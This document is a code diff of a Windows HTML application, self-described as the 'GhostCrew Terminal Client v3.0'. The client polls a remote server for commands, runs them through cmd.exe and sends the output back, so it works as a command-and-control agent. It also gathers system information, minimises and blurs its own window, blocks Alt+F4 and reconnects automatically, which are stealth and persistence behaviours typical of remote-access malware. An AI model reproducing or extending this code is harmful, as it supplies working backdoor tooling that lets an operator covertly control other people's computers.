-            updateStatus("Connected - Last command: " + new Date().toLocaleTimeString());
+            makeServerRequest("get_command", { host_id: SYSTEM.hostId }, function(error, response) {
+                if (error) {
+                    log("Command polling error: " + error.message, "error");
+                    handleConnectionError(error);
+                    return;
+                }
+                
+                if (response.status === "success" && response.command && response.command !== "") {
+                    SYSTEM.lastActivity = new Date().getTime();
+                    
+                    // Check if this is a new session
+                    if (response.session_id && response.session_id !== SESSION.activeSessionId) {
+                        handleNewSession(response.session_id);
+                    }
+                    
+                    // Process the command
+                    processCommand({
+                        id: response.command_id,
+                        command: response.command,
+                        sessionId: response.session_id || SESSION.activeSessionId
+                    });
+                }
+            });
         }
-        
+
+        function handleNewSession(sessionId) {
+            if (SESSION.activeSessionId) {
+                log("Ending previous session: " + SESSION.activeSessionId, "info");
+            }
+            
+            SESSION.activeSessionId = sessionId;
+            SESSION.sessionStartTime = new Date().getTime();
+            resetShellForNewSession();
+            
+            log("New session started: " + sessionId, "success");
+            updateSessionInfo("Active: " + sessionId.substring(0, 12) + "...");
+        }
+
+        function processCommand(commandData) {
+            SESSION.processingCommand = true;
+            var startTime = new Date().getTime();
+            
+            log("Executing: " + commandData.command, "command");
+            updateConnectionStatus("Executing command...");
+            
+            try {
+                var result = executeCommand(commandData.command);
+                var executionTime = (new Date().getTime() - startTime) / 1000;
+                
+                log("Command completed in " + executionTime + "s", "info");
+                
+                submitCommandResult(commandData.id, result, executionTime);
+                
+            } catch (e) {
+                var executionTime = (new Date().getTime() - startTime) / 1000;
+                var errorResult = "Error executing command: " + e.message;
+                
+                log("Command failed: " + e.message, "error");
+                submitCommandResult(commandData.id, errorResult, executionTime);
+            }
+            
+            SESSION.processingCommand = false;
+            updateConnectionStatus("Connected - " + SYSTEM.systemInfo.hostname);
+        }
+
+        function executeCommand(command) {
+            var lowerCommand = command.toLowerCase();
+            if (typeof lowerCommand.trim === 'function') {
+                lowerCommand = lowerCommand.trim();
+            } else {
+                lowerCommand = lowerCommand.replace(/^\s+|\s+$/g, '');
+            }
+            
+            // Handle built-in commands
+            if (lowerCommand === "pwd" || lowerCommand === "cd") {
+                return SESSION.currentDirectory;
+            }
+            
+            if (lowerCommand.indexOf("cd ") === 0) {
+                return handleChangeDirectory(command);
+            }
+            
+            if (lowerCommand.indexOf("set ") === 0 && lowerCommand.indexOf("=") > 0) {
+                return handleSetEnvironmentVariable(command);
+            }
+            
+            if (lowerCommand === "env" || lowerCommand === "set") {
+                return handleShowEnvironment();
+            }
+            
+            if (lowerCommand === "cls" || lowerCommand === "clear") {
+                return "Screen cleared (not applicable in remote session)";
+            }
+            
+            // Execute regular command with full context
+            return executeCommandWithShellContext(command);
+        }
+
         function handleChangeDirectory(command) {
             try {
-                var newPath = command.substring(3).trim();
-                if (newPath === "") {
-                    return currentDirectory;
+                var newPath = command.substring(3);
+                if (typeof newPath.trim === 'function') {
+                    newPath = newPath.trim();
+                } else {
+                    newPath = newPath.replace(/^\s+|\s+$/g, '');
                 }
                 
-                // Handle relative paths
-                var fullPath;
-                if (newPath.indexOf(":") === -1 && !newPath.startsWith("\\")) {
-                    fullPath = currentDirectory + "\\" + newPath;
+                if (newPath === "") {
+                    return SESSION.currentDirectory;
+                }
+                
+                // Handle relative and absolute paths
+                var targetPath;
+                if (newPath.indexOf(":") !== -1 || newPath.charAt(0) === "\\" || newPath.charAt(0) === "/") {
+                    // Absolute path
+                    targetPath = SESSION.shellProcess.ExpandEnvironmentStrings(newPath);
                 } else {
-                    fullPath = newPath;
+                    // Relative path
+                    var separator = SESSION.currentDirectory.charAt(SESSION.currentDirectory.length - 1) === "\\" ? "" : "\\";
+                    targetPath = SESSION.currentDirectory + separator + newPath;
                 }
                 
                 // Normalize path
-                fullPath = shellProcess.ExpandEnvironmentStrings(fullPath);
+                targetPath = SESSION.shellProcess.ExpandEnvironmentStrings(targetPath);
                 
-                // Check if directory exists using FSO
+                // Check if directory exists
                 var fso = new ActiveXObject("Scripting.FileSystemObject");
-                if (fso.FolderExists(fullPath)) {
-                    currentDirectory = fullPath;
-                    if (!currentDirectory.endsWith("\\")) {
-                        currentDirectory += "\\";
+                if (fso.FolderExists(targetPath)) {
+                    SESSION.currentDirectory = targetPath;
+                    if (SESSION.currentDirectory.charAt(SESSION.currentDirectory.length - 1) !== "\\") {
+                        SESSION.currentDirectory += "\\";
                     }
-                    return currentDirectory;
+                    log("Changed directory to: " + SESSION.currentDirectory, "info");
+                    return SESSION.currentDirectory;
                 } else {
-                    return "The system cannot find the path specified.";
+                    return "The system cannot find the path specified: " + targetPath;
                 }
                 
             } catch (e) {
                 return "Error changing directory: " + e.message;
             }
         }
-        
+
         function handleSetEnvironmentVariable(command) {
             try {
                 var parts = command.substring(4).split("=");
                 if (parts.length >= 2) {
-                    var varName = parts[0].trim();
-                    var varValue = parts.slice(1).join("=").trim();
+                    var varName = parts[0];
+                    if (typeof varName.trim === 'function') {
+                        varName = varName.trim().toUpperCase();
+                    } else {
+                        varName = varName.replace(/^\s+|\s+$/g, '').toUpperCase();
+                    }
                     
-                    // Store in our environment tracking
-                    environmentVars[varName] = varValue;
+                    var varValue = parts.slice(1).join("=");
+                    if (typeof varValue.trim === 'function') {
+                        varValue = varValue.trim();
+                    } else {
+                        varValue = varValue.replace(/^\s+|\s+$/g, '');
+                    }
                     
-                    return "Environment variable " + varName + " set.";
+                    // Remove quotes if present
+                    if ((varValue.charAt(0) === '"' && varValue.charAt(varValue.length - 1) === '"') ||
+                        (varValue.charAt(0) === "'" && varValue.charAt(varValue.length - 1) === "'")) {
+                        varValue = varValue.substring(1, varValue.length - 1);
+                    }
+                    
+                    SESSION.environmentVars[varName] = varValue;
+                    log("Environment variable set: " + varName + "=" + varValue, "info");
+                    return "Environment variable " + varName + " has been set.";
                 } else {
-                    return "Invalid SET command syntax.";
+                    return "Invalid SET command syntax. Use: SET VARIABLE=VALUE";
                 }
             } catch (e) {
                 return "Error setting environment variable: " + e.message;
             }
         }
-        
-        function executeCommandWithContext(command) {
+
+        function handleShowEnvironment() {
             try {
-                var fso = new ActiveXObject("Scripting.FileSystemObject");
-                
-                // Create a unique temporary file for this command
-                var tempFile = shellProcess.ExpandEnvironmentStrings("%TEMP%\\cmd_output_" + new Date().getTime() + "_" + Math.random().toString(36).substr(2, 9) + ".txt");
-                
-                // Build command with current directory context
-                var contextualCommand = "cd /d \"" + currentDirectory + "\" && " + command;
-                
-                // Add environment variables to command if any were set
-                var envPrefix = "";
-                for (var envVar in environmentVars) {
-                    if (environmentVars.hasOwnProperty(envVar)) {
-                        envPrefix += "set " + envVar + "=" + environmentVars[envVar] + " && ";
+                var envList = [];
+                var count = 0;
+                for (var varName in SESSION.environmentVars) {
+                    if (SESSION.environmentVars.hasOwnProperty(varName)) {
+                        envList.push(varName + "=" + SESSION.environmentVars[varName]);
+                        count++;
+                    }
+                }
+                if (count === 0) {
+                    return "No custom environment variables set.";
+                }
+                return envList.join("\r\n");
+            } catch (e) {
+                return "Error displaying environment variables: " + e.message;
+            }
+        }
+
+        function executeCommandWithShellContext(command) {
+            try {
+                // Build environment setup commands
+                var envSetup = [];
+                for (var varName in SESSION.environmentVars) {
+                    if (SESSION.environmentVars.hasOwnProperty(varName)) {
+                        envSetup.push("SET " + varName + "=" + SESSION.environmentVars[varName]);
                     }
                 }
                 
-                if (envPrefix) {
-                    contextualCommand = envPrefix + contextualCommand;
+                // Build the complete command with context
+                var contextualCommand = [];
+                
+                // Set environment variables
+                if (envSetup.length > 0) {
+                    contextualCommand = contextualCommand.concat(envSetup);
                 }
                 
-                // Execute command and capture output
-                var fullCommand = "cmd /c \"" + contextualCommand + "\" > \"" + tempFile + "\" 2>&1 && echo. && cd";
+                // Change to current directory
+                contextualCommand.push("CD /D \"" + SESSION.currentDirectory + "\"");
                 
-                // Execute and wait for completion
-                shellProcess.Run(fullCommand, 0, true);
+                // Add the actual command
+                contextualCommand.push(command);
                 
-                var output = "";
+                // Join all commands
+                var fullCommand = contextualCommand.join(" && ");
                 
-                // Read the output
-                if (fso.FileExists(tempFile)) {
-                    var file = fso.OpenTextFile(tempFile, 1);
-                    var content = file.ReadAll();
-                    file.Close();
+                log("Executing: " + command + " (in " + SESSION.currentDirectory + ")", "info");
+                
+                // Execute command directly and capture output using WScript.Shell.Exec
+                try {
+                    var exec = SESSION.shellProcess.Exec("cmd.exe /C \"" + fullCommand + "\"");
                     
-                    // Parse output to extract directory change
-                    var lines = content.split("\r\n");
-                    var lastLine = "";
-                    var outputLines = [];
+                    // Wait for command to complete and read output
+                    var output = "";
+                    var errorOutput = "";
                     
-                    for (var i = 0; i < lines.length; i++) {
-                        var line = lines[i];
-                        if (line.trim() !== "") {
-                            lastLine = line.trim();
-                            outputLines.push(line);
+                    // Read stdout
+                    while (!exec.StdOut.AtEndOfStream) {
+                        output += exec.StdOut.ReadAll();
+                    }
+                    
+                    // Read stderr
+                    while (!exec.StdErr.AtEndOfStream) {
+                        errorOutput += exec.StdErr.ReadAll();
+                    }
+                    
+                    // Wait for process to finish
+                    while (exec.Status === 0) {
+                        // Wait a bit
+                        WScript.Sleep(50);
+                    }
+                    
+                    var exitCode = exec.ExitCode;
+                    
+                    // Combine output and error output
+                    var fullOutput = output;
+                    if (errorOutput) {
+                        if (fullOutput) {
+                            fullOutput += "\n" + errorOutput;
+                        } else {
+                            fullOutput = errorOutput;
                         }
                     }
                     
-                    // Check if the last line looks like a directory path (from the 'cd' command)
-                    if (lastLine && lastLine.indexOf(":") !== -1 && lastLine.indexOf("\\") !== -1) {
-                        // Update current directory
-                        currentDirectory = lastLine;
-                        if (!currentDirectory.endsWith("\\")) {
-                            currentDirectory += "\\";
+                    // Process the output
+                    var trimmedOutput = fullOutput;
+                    if (typeof trimmedOutput.trim === 'function') {
+                        trimmedOutput = trimmedOutput.trim();
+                    } else {
+                        trimmedOutput = trimmedOutput.replace(/^\s+|\s+$/g, '');
+                    }
+                    
+                    log("Command output length: " + trimmedOutput.length + " chars", "info");
+                    if (trimmedOutput.length > 0) {
+                        log("Output preview: " + trimmedOutput.substring(0, 100) + (trimmedOutput.length > 100 ? "..." : ""), "info");
+                    }
+                    
+                    // Check if command changed the working directory
+                    updateCurrentDirectory();
+                    
+                    // Return the actual output
+                    if (trimmedOutput.length > 0) {
+                        return trimmedOutput;
+                    } else {
+                        if (exitCode === 0) {
+                            return "Command completed successfully (no output).";
+                        } else {
+                            return "Command completed with exit code: " + exitCode;
                         }
-                        // Remove the directory line from output
-                        outputLines.pop();
                     }
                     
-                    output = outputLines.join("\r\n");
-                    
-                    // Clean up temp file
-                    try {
-                        fso.DeleteFile(tempFile);
-                    } catch (e) {
-                        // Ignore deletion errors
-                    }
+                } catch (execError) {
+                    // Fallback to Run method if Exec fails
+                    log("Exec method failed, trying Run method: " + execError.message, "warning");
+                    return executeCommandWithRunMethod(fullCommand);
                 }
-                
-                return output || "Command executed successfully.";
                 
             } catch (e) {
                 return "Error executing command: " + e.message;
             }
         }
         
-        function submitCommandResult(commandId, output, executionTime) {
-            logMessage("Sending command result back to server...");
-            
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", SERVER_URL, true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    if (xhr.status === 200) {
-                        try {
-                            var response = JSON.parse(xhr.responseText);
-                            if (response.status === "success") {
-                                logMessage("Command result sent successfully");
-                            } else {
-                                logMessage("Error sending command result: " + response.message);
-                            }
-                        } catch (e) {
-                            logMessage("Error parsing submit result response: " + e.message);
-                        }
-                    } else {
-                        logMessage("Server error while sending command result: " + xhr.status);
-                    }
-                }
-            };
-            
-            // Build data to send
-            var formData = "action=submit_result";
-            formData += "&command_id=" + encodeURIComponent(commandId);
-            formData += "&output=" + encodeURIComponent(output);
-            formData += "&execution_time=" + encodeURIComponent(executionTime);
-            
-            xhr.send(formData);
-        }
-        
-        function pingServer() {
-            if (!hostId) return;
-            
-            logMessage("Pinging server to verify connection...");
-            
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", SERVER_URL, true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    if (xhr.status === 200) {
-                        try {
-                            var response = JSON.parse(xhr.responseText);
-                            if (response.status === "success") {
-                                logMessage("Connection verified with server");
-                                lastCommandTime = new Date().getTime();
-                            } else {
-                                logMessage("Server returned error during ping: " + response.message);
-                                if (AUTO_RECONNECT) {
-                                    isConnected = false;
-                                    attemptReconnect();
-                                }
-                            }
-                        } catch (e) {
-                            logMessage("Error parsing ping response: " + e.message);
-                            if (AUTO_RECONNECT) {
-                                isConnected = false;
-                                attemptReconnect();
-                            }
-                        }
-                    } else {
-                        logMessage("Server error during ping: " + xhr.status);
-                        if (AUTO_RECONNECT) {
-                            isConnected = false;
-                            attemptReconnect();
-                        }
-                    }
-                }
-            };
-            
-            xhr.onerror = function() {
-                logMessage("Network error during ping");
-                if (AUTO_RECONNECT) {
-                    isConnected = false;
-                    attemptReconnect();
-                }
-            };
-            
-            xhr.send("action=ping_host&host_id=" + encodeURIComponent(hostId));
-        }
-        
-        function attemptReconnect() {
-            if (reconnectAttempts >= 5) {
-                updateStatus("Reconnection failed after 5 attempts");
-                logMessage("Giving up after 5 reconnection attempts");
-                return;
-            }
-            
-            reconnectAttempts++;
-            var delay = reconnectAttempts * 5000;
-            
-            updateStatus("Connection lost. Reconnecting in " + (delay/1000) + "s...");
-            logMessage("Attempting to reconnect in " + (delay/1000) + " seconds (attempt " + reconnectAttempts + "/5)");
-            
-            // Reset session on reconnect
-            currentSessionId = null;
-            
-            setTimeout(function() {
-                connect();
-            }, delay);
-        }
-        
-        function getSystemInfo() {
-            var info = {
-                hostname: "",
-                ipAddress: "127.0.0.1",
-                osInfo: ""
-            };
-            
+        function executeCommandWithRunMethod(fullCommand) {
             try {
-                var network = new ActiveXObject("WScript.Network");
-                info.hostname = network.ComputerName;
+                // Fallback method using Run with temporary file (only as last resort)
+                var fso = new ActiveXObject("Scripting.FileSystemObject");
+                var tempDir = SESSION.shellProcess.ExpandEnvironmentStrings("%TEMP%");
+                var tempFile = tempDir + "\\ghostcrew_" + new Date().getTime() + "_" + Math.floor(Math.random() * 10000) + ".tmp";
                 
-                var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
-                var osItems = new Enumerator(wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem"));
+                // Execute command and redirect to temp file
+                var cmdLine = "cmd.exe /C \"" + fullCommand + "\" > \"" + tempFile + "\" 2>&1";
                 
-                for (; !osItems.atEnd(); osItems.moveNext()) {
-                    var osItem = osItems.item();
-                    info.osInfo = osItem.Caption + " " + osItem.Version + " (" + osItem.OSArchitecture + ")";
-                    break;
-                }
+                log("Using fallback Run method with temp file", "warning");
                 
-                var nicItems = new Enumerator(wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True"));
+                var execResult = SESSION.shellProcess.Run(cmdLine, 0, true);
                 
-                for (; !nicItems.atEnd(); nicItems.moveNext()) {
-                    var nicItem = nicItems.item();
-                    var ipAddresses = new VBArray(nicItem.IPAddress).toArray();
-                    
-                    for (var i = 0; i < ipAddresses.length; i++) {
-                        var ip = ipAddresses[i];
-                        if (ip.indexOf(".") > 0 && ip !== "127.0.0.1") {
-                            info.ipAddress = ip;
-                            break;
+                // Read the output
+                var output = "";
+                var outputFound = false;
+                
+                // Give the file system a moment to write the file
+                WScript.Sleep(100);
+                
+                if (fso.FileExists(tempFile)) {
+                    try {
+                        var file = fso.OpenTextFile(tempFile, 1);
+                        if (!file.AtEndOfStream) {
+                            output = file.ReadAll();
+                            outputFound = true;
                         }
+                        file.Close();
+                    } catch (readError) {
+                        output = "Error reading command output: " + readError.message;
+                        outputFound = true;
                     }
                     
-                    if (info.ipAddress !== "127.0.0.1") {
-                        break;
+                    // Clean up temp file
+                    try {
+                        fso.DeleteFile(tempFile);
+                    } catch (deleteError) {
+                        log("Could not delete temp file: " + deleteError.message, "warning");
+                    }
+                } else {
+                    log("Temp file was not created at: " + tempFile, "error");
+                    return "Error: Could not capture command output (temp file not created).";
+                }
+                
+                // Process the output
+                var trimmedOutput = output;
+                if (typeof trimmedOutput.trim === 'function') {
+                    trimmedOutput = trimmedOutput.trim();
+                } else {
+                    trimmedOutput = trimmedOutput.replace(/^\s+|\s+$/g, '');
+                }
+                
+                if (trimmedOutput.length > 0) {
+                    return trimmedOutput;
+                } else if (outputFound) {
+                    if (execResult === 0) {
+                        return "Command completed successfully (no output).";
+                    } else {
+                        return "Command completed with exit code: " + execResult;
+                    }
+                } else {
+                    return "Error: Could not capture command output.";
+                }
+                
+            } catch (e) {
+                return "Error in fallback execution method: " + e.message;
+            }
+        }
+
+        function updateCurrentDirectory() {
+            try {
+                // Get current directory by executing 'cd' command
+                var tempFile = SESSION.shellProcess.ExpandEnvironmentStrings("%TEMP%\\ghostcrew_pwd_" + new Date().getTime() + ".tmp");
+                var cmdLine = "cmd.exe /C \"CD /D \"" + SESSION.currentDirectory + "\" && CD\" > \"" + tempFile + "\"";
+                
+                SESSION.shellProcess.Run(cmdLine, 0, true);
+                
+                var fso = new ActiveXObject("Scripting.FileSystemObject");
+                if (fso.FileExists(tempFile)) {
+                    try {
+                        var file = fso.OpenTextFile(tempFile, 1);
+                        if (!file.AtEndOfStream) {
+                            var newDir = file.ReadAll();
+                            if (typeof newDir.trim === 'function') {
+                                newDir = newDir.trim();
+                            } else {
+                                newDir = newDir.replace(/^\s+|\s+$/g, '');
+                            }
+                            
+                            var currentDirWithoutSlash = SESSION.currentDirectory.replace(/\\$/, "");
+                            if (newDir && newDir !== currentDirWithoutSlash) {
+                                SESSION.currentDirectory = newDir;
+                                if (SESSION.currentDirectory.charAt(SESSION.currentDirectory.length - 1) !== "\\") {
+                                    SESSION.currentDirectory += "\\";
+                                }
+                                log("Working directory updated: " + SESSION.currentDirectory, "info");
+                            }
+                        }
+                        file.Close();
+                    } catch (e) {
+                        // Ignore errors
+                    }
+                    
+                    try {
+                        fso.DeleteFile(tempFile);
+                    } catch (e) {
+                        // Ignore cleanup errors
                     }
                 }
             } catch (e) {
-                logMessage("Error collecting system info: " + e.message);
-            }
-            
-            logMessage("System info: " + info.hostname + " (" + info.ipAddress + "), " + info.osInfo);
-            return info;
-        }
-        
-        function updateStatus(message) {
-            document.getElementById("status").innerHTML = message;
-            document.title = "Terminal Client - " + message;
-        }
-        
-        function logMessage(message) {
-            var now = new Date();
-            var timestamp = now.toLocaleTimeString();
-            var logEl = document.getElementById("log");
-            logEl.innerHTML += "[" + timestamp + "] " + message + "<br>";
-            logEl.scrollTop = logEl.scrollHeight;
-            
-            var logLines = logEl.innerHTML.split("<br>");
-            if (logLines.length > 100) {
-                logEl.innerHTML = logLines.slice(logLines.length - 100).join("<br>");
+                // Ignore errors in directory detection
             }
         }
-        
-        function handleConnectionError(message) {
-            updateStatus("Connection failed");
-            logMessage("Connection error: " + message);
+
+        function submitCommandResult(commandId, output, executionTime) {
+            log("Submitting command result...", "info");
             
-            if (AUTO_RECONNECT) {
-                attemptReconnect();
+            var resultData = {
+                command_id: commandId,
+                output: output,
+                execution_time: executionTime
+            };
+            
+            makeServerRequest("submit_result", resultData, function(error, response) {
+                if (error) {
+                    log("Failed to submit result: " + error.message, "error");
+                    return;
+                }
+                
+                if (response.status === "success") {
+                    log("Command result submitted successfully", "success");
+                } else {
+                    log("Server rejected result: " + response.message, "error");
+                }
+            });
+        }
+
+        // ===================== CONNECTION MANAGEMENT =====================
+        function handleConnectionError(error) {
+            SYSTEM.isConnected = false;
+            log("Connection error: " + error.message, "error");
+            
+            if (CONFIG.AUTO_RECONNECT && SYSTEM.reconnectAttempts < CONFIG.MAX_RECONNECT_ATTEMPTS) {
+                attemptReconnection();
+            } else {
+                updateConnectionStatus("Connection failed");
+                updateSessionInfo("No active session");
+                stopServices();
             }
         }
-        
+
+        function attemptReconnection() {
+            SYSTEM.reconnectAttempts++;
+            var delay = CONFIG.RECONNECT_DELAY_BASE * SYSTEM.reconnectAttempts;
+            
+            log("Attempting reconnection " + SYSTEM.reconnectAttempts + "/" + CONFIG.MAX_RECONNECT_ATTEMPTS + " in " + (delay/1000) + "s", "warning");
+            updateConnectionStatus("Reconnecting in " + (delay/1000) + "s...");
+            
+            if (TIMERS.reconnectTimer) clearTimeout(TIMERS.reconnectTimer);
+            TIMERS.reconnectTimer = setTimeout(function() {
+                log("Reconnection attempt " + SYSTEM.reconnectAttempts + "/" + CONFIG.MAX_RECONNECT_ATTEMPTS, "info");
+                registerWithServer();
+            }, delay);
+        }
+
+        // ===================== INITIALIZATION =====================
+        function initialize() {
+            log("GhostCrew Terminal Client v3.0 initializing...", "info");
+            log("Enhanced with persistent shell session support", "info");
+            
+            // Try to restore previous host ID
+            try {
+                var savedHostId = localStorage.getItem("ghostcrew_host_id");
+                if (savedHostId) {
+                    SYSTEM.hostId = savedHostId;
+                    log("Restored previous host ID: " + SYSTEM.hostId, "info");
+                }
+            } catch(e) {
+                // LocalStorage not available
+                log("LocalStorage not available, will generate new host ID", "warning");
+            }
+            
+            // Initialize shell
+            if (!initializeShell()) {
+                log("Failed to initialize shell - terminal functionality will be limited", "error");
+                updateConnectionStatus("Shell initialization failed");
+                return;
+            }
+            
+            // Collect system information
+            collectSystemInfo();
+            
+            // Start connection process
+            registerWithServer();
+            
+            // Minimize window after initialization
+            setTimeout(function() {
+                try {
+                    window.resizeTo(500, 280);
+                    setTimeout(function() {
+                        window.blur();
+                    }, 1000);
+                } catch(e) {
+                    log("Could not minimize window: " + e.message, "warning");
+                }
+            }, 2000);
+        }
+
+        // ===================== EVENT HANDLERS =====================
+        window.onload = function() {
+            initialize();
+        };
+
         window.onbeforeunload = function() {
-            if (isConnected) {
+            log("Client shutting down...", "info");
+            
+            // Attempt to notify server of disconnect
+            if (SYSTEM.isConnected && SYSTEM.hostId) {
                 try {
                     var xhr = new XMLHttpRequest();
-                    xhr.open("POST", SERVER_URL, false);
+                    xhr.open("POST", CONFIG.SERVER_URL, false); // Synchronous for onbeforeunload
                     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                    xhr.send("action=ping_host&host_id=" + encodeURIComponent(hostId));
+                    xhr.send("action=ping_host&host_id=" + encodeURIComponent(SYSTEM.hostId) + "&status=disconnecting");
                 } catch(e) {
-                    // Ignore errors during close
+                    // Ignore errors during shutdown
                 }
             }
+            
+            stopServices();
         };
+
+        window.onerror = function(message, source, lineno, colno, error) {
+            log("JavaScript error: " + message + " at " + source + ":" + lineno, "error");
+            return false; // Don't suppress the error
+        };
+
+        // Prevent accidental closure
+        window.onkeydown = function(e) {
+            // Prevent Alt+F4
+            if (e.altKey && e.keyCode === 115) {
+                e.preventDefault();
+                return false;
+            }
+        };
+
+        // Keep the application responsive
+        setInterval(function() {
+            // Basic heartbeat to prevent IE from freezing
+            var now = new Date().getTime();
+            if (SYSTEM.isConnected && (now - SYSTEM.lastActivity) > 300000) { // 5 minutes
+                log("Long period of inactivity detected, checking connection...", "warning");
+                pingServer();
+            }
+        }, 60000); // Check every minute
+
+        log("GhostCrew Terminal Client loaded and ready", "success");
     </script>
 </body>
 </html>
